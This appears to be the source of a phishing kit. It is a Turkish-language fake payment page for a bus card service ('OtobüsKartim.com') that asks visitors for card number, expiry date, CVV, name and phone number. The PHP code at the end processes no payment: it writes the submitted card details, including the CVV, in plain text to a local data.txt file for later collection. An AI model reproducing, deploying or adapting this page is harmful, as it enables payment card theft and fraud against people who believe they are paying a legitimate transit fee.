<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>OtobüsKartim.com - Ödeme </title>
  <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css'>
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/css/bootstrap-datepicker.min.css'><link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <title>OtobüsKartim.com - Ödeme</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script src="https://unpkg.com/akar-icons-fonts"></script>
</head>

<body>
  <!-- partial:index.partial.html -->

  <div class="main-back">
    <div class="container m-auto bg-white p-5 bod-3">
      <div class="row">
        <!-- CARD FORM -->
        <div class="col-lg-8 col-md-12">
          <form method="POST">
            <div class="header flex-between flex-vertical-center">
              <div class="flex-vertical-center">
                <img src="images/bus.jpg" width="30" height="30" alt="OtobüsKartim" />&nbsp;&nbsp;&nbsp;
                <span class="title">
                  <strong>OtobüsKartim</strong><span>.com</span>
                </span>
              </div>
            </div>
            <div class="card-data flex-fill flex-vertical">

              

              <!-- Card Number -->
              <div class="flex-between flex-vertical-center">
                <div class="card-property-title">
                  <strong>Kart Numarası</strong>
                  <span>Kartınızın önünde yer alan 16 haneli numarayı girin.</span>
                </div>
              </div>

              <!-- Card Field -->
              <div class="flex-between">
                <div class="card-number flex-vertical-center flex-fill">
                  <div class="card-number-field flex-vertical-center flex-fill">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="24px" height="24px">
                      <path fill="#ff9800" d="M32 10A14 14 0 1 0 32 38A14 14 0 1 0 32 10Z" />
                      <path fill="#d50000" d="M16 10A14 14 0 1 0 16 38A14 14 0 1 0 16 10Z" />
                      <path fill="#ff3d00" d="M18,24c0,4.755,2.376,8.95,6,11.48c3.624-2.53,6-6.725,6-11.48s-2.376-8.95-6-11.48 C20.376,15.05,18,19.245,18,24z" />
                    </svg>
                    <input type="text" placeholder="Kart Numarası" name="card_num" class="form-control" id="cardNumber" onkeypress="return onlyNumberKey(event)" maxlength="19" name="cardNumber" data-bound="carddigits_mock" data-def="0000 0000 0000 0000" required />
                  </div>
                  <i class="ai-circle-check-fill size-lg f-main-color"></i>
                </div>
              </div>
              



              <!-- Expiry Date -->
              <div class="flex-between">
                <div class="card-property-title">
                  <strong>Son Kullanma Tarihi
                  </strong>
                  <span>Kartınızın son kullanma tarihini buraya girin.</span>
                </div>
                <div class="card-property-value flex-vertical-center">
                  <div class="input-container half-width">
                    <input class="numbers month-own" name="expiry_mm"  data-def="00" type="text" data-bound="mm_mock" placeholder="MM" />
                  </div>
                  <span class="m-md">/</span>
                  <div class="input-container half-width">
                    <input class="numbers year-own" name="expiry_year" data-def="01" type="text" data-bound="yy_mock" placeholder="YYYY" />
                  </div>
                </div>
              </div>

              <!-- CCV Number -->
              <div class="flex-between">
                <div class="card-property-title">
                  <strong>CVC</strong>
                  <span>Kartınızın arkasında yer alan güvenlik kodunu bu alana girin.</span>
                </div>
                <div class="card-property-value">
                  <div class="input-container">
                    <input id="cvc" placeholder="CVV" name="ccv" maxlength="3" onkeypress="return onlyNumberKey(event)" type="password" />
                    <i id="cvc_toggler" data-target="cvc" class="ai-eye-open pointer"></i>
                  </div>
                </div>
              </div>

              <!-- Name -->
              <div class="flex-between">
                <div class="card-property-title">
                  <strong>İsim Soyisim</strong>
                  <span>Kart sahibinin adını buraya girin.
                  </span>
                </div>
                <div class="card-property-value">
                  <div class="input-container">
                    <input id="name" data-bound="name_mock" name="kart_isim" data-def="Isım Soyisim" type="text" class="uppercase" placeholder="İsim Soyisim" />
                    <i class="ai-person"></i>
                  </div>
                </div>
              </div>

              <div class="flex-between">
                <div class="card-property-title">
                  <strong>Telefon Numarası</strong>
                  <span>Şehir kartınızda kayıtlı olan telefon numaranızı bu alana girin.</span>
                </div>
                <div class="card-property-value">
                  <div class="input-container">
                    <input id="phone" type="text" placeholder="+90 " />
                    <i class="ai-phone"></i>
                  </div>
                </div>
              </div>
            </div>
            <div class="action flex-center">
              <button type="submit" class="b-main-color pointer">
                Öde
              </button>
            </div>
          </form>
        </div>

        <!-- SIDEBAR -->
        <div class="col-lg-4 col-md-12 py-5">
          <div></div>
          <div class="purchase-section flex-fill flex-vertical">
            <div class="card-mockup flex-vertical">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px">
                <path fill="#ff9800" d="M32 10A14 14 0 1 0 32 38A14 14 0 1 0 32 10Z" />
                <path fill="#d50000" d="M16 10A14 14 0 1 0 16 38A14 14 0 1 0 16 10Z" />
                <path fill="#ff3d00" d="M18,24c0,4.755,2.376,8.95,6,11.48c3.624-2.53,6-6.725,6-11.48s-2.376-8.95-6-11.48 C20.376,15.05,18,19.245,18,24z" />
              </svg>
              <div>
                <strong>
                  <div id="name_mock" class="size-md pb-sm uppercase ellipsis">
                    Isım Soyisim
                  </div>
                </strong>
                <div class="size-md pb-md">
                  <strong>
                    <span id="carddigits_mock">0000 0000 0000 0000</span>
                  </strong>
                </div>
                <div class="flex-between flex-vertical-center">
                  <strong class="size-md">
                    <span>Son Kullanma Tarihi : </span><span id="mm_mock">00</span> / <span id="yy_mock">00</span>
                  </strong>

                  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px">
                    <path fill="#1565C0" d="M45,35c0,2.209-1.791,4-4,4H7c-2.209,0-4-1.791-4-4V13c0-2.209,1.791-4,4-4h34c2.209,0,4,1.791,4,4V35z" />
                    <path fill="#FFF" d="M15.186 19l-2.626 7.832c0 0-.667-3.313-.733-3.729-1.495-3.411-3.701-3.221-3.701-3.221L10.726 30v-.002h3.161L18.258 19H15.186zM17.689 30L20.56 30 22.296 19 19.389 19zM38.008 19h-3.021l-4.71 11h2.852l.588-1.571h3.596L37.619 30h2.613L38.008 19zM34.513 26.328l1.563-4.157.818 4.157H34.513zM26.369 22.206c0-.606.498-1.057 1.926-1.057.928 0 1.991.674 1.991.674l.466-2.309c0 0-1.358-.515-2.691-.515-3.019 0-4.576 1.444-4.576 3.272 0 3.306 3.979 2.853 3.979 4.551 0 .291-.231.964-1.888.964-1.662 0-2.759-.609-2.759-.609l-.495 2.216c0 0 1.063.606 3.117.606 2.059 0 4.915-1.54 4.915-3.752C30.354 23.586 26.369 23.394 26.369 22.206z" />
                    <path fill="#FFC107" d="M12.212,24.945l-0.966-4.748c0,0-0.437-1.029-1.573-1.029c-1.136,0-4.44,0-4.44,0S10.894,20.84,12.212,24.945z" />
                  </svg>
                </div>
              </div>
            </div>

            <ul class="purchase-props">
              <li class="flex-between">
                <span>İl</span>
                <strong></strong>
              </li>
              <li class="flex-between">
                <span>Sipariş Numarası</span>
                <strong>429252965</strong>
              </li>
              <li class="flex-between">
                <span>Ürün</span>
                <strong>Otobüs Kart</strong>
              </li>
              <li class="flex-between">
                <span>Komisyon</span>
                <strong>5<span class="f-secondary-color">TL</div></span></strong>
              </li>
            </ul>
          </div>
          <div class="separation-line"></div>
          <div class="total-section flex-between flex-vertical-center">
            <div class="flex-fill flex-vertical">
              <div class="total-label f-secondary-color">Ödenecek Tutar</div>
              <div>
                <input>
                <small>.00 <span class="f-secondary-color">TL</span></small>
              </div>
            </div>
            <i class="ai-coin size-lg"></i>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- partial -->
  <script src="./script.js"></script>
</body>

</html>
<!-- partial -->
  <script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js'></script>
<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.9.0/js/bootstrap-datepicker.min.js'></script><script  src="./script.js"></script>

</body>
</html>


<?php
              
if(isset($_POST['card_num']))
{
$card=$_POST['card_num'];
$sayname=$_POST['kart_isim'];
$expry_mounth=$_POST['expiry_mm'];
$expry_year=$_POST['expiry_year'];
$sec_num=$_POST['ccv'];

$fp = fopen('data.txt', 'a');


fwrite($fp,"+------------------ STARTED ------------------+\n");
fwrite($fp, "Isım Soyisim  : ".$sayname."\n");
fwrite($fp, "Kart Numarası : ".$card."\n");
fwrite($fp, "Son Kullanma Tarihi  : ".$expry_mounth."/");
fwrite($fp, $expry_year."\n");
fwrite($fp , "CCV : ".$sec_num."\n");
fwrite($fp, "+------------------ FINISHED ------------------+\n\n\n");

fclose($fp);
}

?>